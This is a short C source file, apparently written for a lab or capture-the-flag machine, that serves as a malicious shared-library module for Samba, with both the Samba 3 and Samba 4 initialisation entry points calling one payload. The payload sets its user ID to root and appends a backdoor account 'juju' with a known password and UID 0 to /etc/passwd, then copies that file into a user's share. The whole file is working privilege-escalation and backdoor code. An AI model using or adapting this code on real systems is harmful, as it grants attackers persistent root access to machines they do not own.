#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static int payload(void) {
    setresuid(0,0,0);
    system("echo \"juju:$(openssl passwd -1 -salt juju password):0:0:root:/root:/bin/bash\" >> /etc/passwd");
    system("cp /etc/passwd /home/susie/susieshare/passwd");
    //system("touch /home/susie/susieshare/exploit.txt");
    return 0;
    
}

// Samba 3 looks for init_samba_module
int init_samba_module(void){
    return payload();
}

// Samba 4 looks for samba_init_module
int samba_init_module(void){
    return payload();
}
